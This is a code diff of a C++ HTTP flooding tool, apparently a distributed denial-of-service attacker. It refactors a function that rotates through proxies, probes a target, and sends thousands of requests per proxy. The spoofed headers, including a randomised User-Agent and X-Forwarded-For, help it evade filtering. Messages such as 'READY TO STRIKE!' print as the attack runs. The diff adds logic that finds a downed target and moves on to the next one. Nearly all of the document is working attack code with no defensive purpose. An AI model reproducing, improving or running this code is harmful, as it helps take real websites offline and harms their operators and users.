@@ -1,21 +1,16 @@
-#include <string>
-#include <vector>
-#include <atomic>
+#include <thread>
+#include <chrono>
 
-#include "json.hpp"
+#include "nlohmann/json.hpp"
 
-#include "curl_wrapper.hpp"
-#include "utils.hpp"
+#include "config.h"
+#include "attacker.h"
+#include "curl_wrapper.h"
+#include "utils.h"
 
-constexpr const char *PROXY_PROBING = "https://www.google.com";
-
-constexpr const size_t MAX_PROXY_ATTACKS = 5000;
-constexpr const size_t DISCOVER_TIMEOUT_SECONDS = 30;
-constexpr const size_t FIRE_TIMEOUT_SECONDS = 10;
-
-inline static void Fire(const std::vector<std::string> &apiList, std::atomic<bool> &shouldStop)
+void Fire(const std::vector<std::string> &apiList, std::atomic<bool> &shouldStop)
 {
-	CURLWrapper wrapper;
+	CURLLoader wrapper;
 
 	std::string currentTarget{""};
 	std::pair<std::string, std::string> currentProxy;
@@ -23,6 +18,8 @@ inline static void Fire(const std::vector<std::string> &apiList, std::atomic<boo
 	bool isProxyValid{false};
 	
 	size_t currentProxyAttacks{0};
+
+	size_t proxyLoadTries{0};
 
 	// Trying to get api response
 	while(!shouldStop.load())
@@ -78,7 +75,6 @@ inline static void Fire(const std::vector<std::string> &apiList, std::atomic<boo
 				std::string proxyIP = proxy["ip"];
 				std::string proxyAuth{""};
 
-
 				try
 				{
 					proxyAuth = proxy["auth"];
@@ -93,7 +89,7 @@ inline static void Fire(const std::vector<std::string> &apiList, std::atomic<boo
 					proxyIP.erase(index, 1);
 				}
 
-				const auto respCode = wrapper.Ping(FIRE_TIMEOUT_SECONDS);
+				const auto respCode = wrapper.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS);
 				if(respCode >= 200 && respCode < 300)
 				{
 					currentProxy = {std::move(proxyIP), std::move(proxyAuth)};
@@ -102,6 +98,15 @@ inline static void Fire(const std::vector<std::string> &apiList, std::atomic<boo
 
 					// std::cout << "Found valid proxy looking for target" << std::endl;
 					break;
+				}
+				else if(respCode >= 500)
+				{
+					std::cout << "Server" << currentTarget << " probably down";
+					break;
+				}
+				else
+				{
+					std::cerr << "Proxy: " << proxyIP << " failed" << std::endl;
 				}
 			}
 
@@ -112,28 +117,31 @@ inline static void Fire(const std::vector<std::string> &apiList, std::atomic<boo
 			}
 		}
 
+		if(!isProxyValid)
+		{
+			continue;
+		}
 		// Probing target
-		wrapper.SetHeaders({
-			 {"Content-Type", "application/json"},
-			 {"cf-visitor", "https"},
-			 {"User-Agent", ChoseUseragent()},
-			 {"Connection", "keep-alive"},
-			 {"Accept", "application/json, text/plain, */*"},
-			 {"Accept-Language", "ru"},
-			 {"x-forwarded-proto", "https"},
-			 {"Accept-Encoding", "gzip, deflate, br"}
-		});
+		Headers headers{
+			{"Content-Type", "*/*"},
+			{"Cf-Visitor", "https"},
+			{"User-Agent", ChoseUseragent()},
+			{"Connection", "keep-alive"},
+			{"Accept", "application/json, text/plain, */*"},
+			{"Accept-Language", "ru"},
+			{"Accept-Encoding", "gzip, deflate, br"},
+			{"X-Forwarded-Proto", "https"},
+			{"X-Forwarder-For", currentProxy.first},
+			{"Cache-Control", "no-store"}
+		};
+
+		wrapper.SetHeaders(headers);
+
 		wrapper.SetTarget(currentTarget);
-		const long targetRespCode = wrapper.Ping(DISCOVER_TIMEOUT_SECONDS);
-		if(targetRespCode >= 200 && targetRespCode < 300)
+		const long targetRespCode = wrapper.Ping(AttackerConfig::DISCOVER_TIMEOUT_SECONDS);
+		if(targetRespCode >= 200 && targetRespCode < 400)
 		{
 			std::cout << "LOCK AND LOAD, READY TO STRIKE!" << std::endl;
-		}
-		else if(targetRespCode > 500)
-		{
-			// std::cout << "This one is dead looking for target" << std::endl;
-			currentTarget = "";
-			continue;
 		}
 		else
 		{
@@ -143,30 +151,28 @@ inline static void Fire(const std::vector<std::string> &apiList, std::atomic<boo
 		}
 
 		// Attacking
-		for(; currentProxyAttacks < MAX_PROXY_ATTACKS && !shouldStop.load(); currentProxyAttacks++)
+		for(; currentProxyAttacks < ProxyConfig::MAX_PROXY_ATTACKS && 
+				!shouldStop.load(); currentProxyAttacks++)
 		{
-			wrapper.SetHeaders({
-				 {"Content-Type", "application/json"},
-				 {"cf-visitor", "https"},
-				 {"User-Agent", ChoseUseragent()},
-				 {"Connection", "keep-alive"},
-				 {"Accept", "application/json, text/plain, */*"},
-				 {"Accept-Language", "ru"},
-				 {"x-forwarded-proto", "https"},
-				 {"Accept-Encoding", "gzip, deflate, br"}
-			});
+			UpdateHeaders(headers, currentProxy.first);
+			wrapper.SetHeaders(headers);
+
 			const long respCode = wrapper.Ping(20);
 			if(respCode >= 200 && respCode < 300)
 			{
 				std::cout << "Succesfuly attacked!" << std::endl;
 			}
+			else if(respCode >= 500)
+			{
+				std::cout << "Target: " << currentTarget << " is down, looking for others" << std::endl;
+				currentTarget = "";
+				break;
+			}
 		}
 
-		if(currentProxyAttacks >= MAX_PROXY_ATTACKS)
+		if(currentProxyAttacks >= ProxyConfig::MAX_PROXY_ATTACKS)
 		{
 			std::cout << "Current proxy exhausted, looking for other" << std::endl;
 		}
-
 	}
-
 }
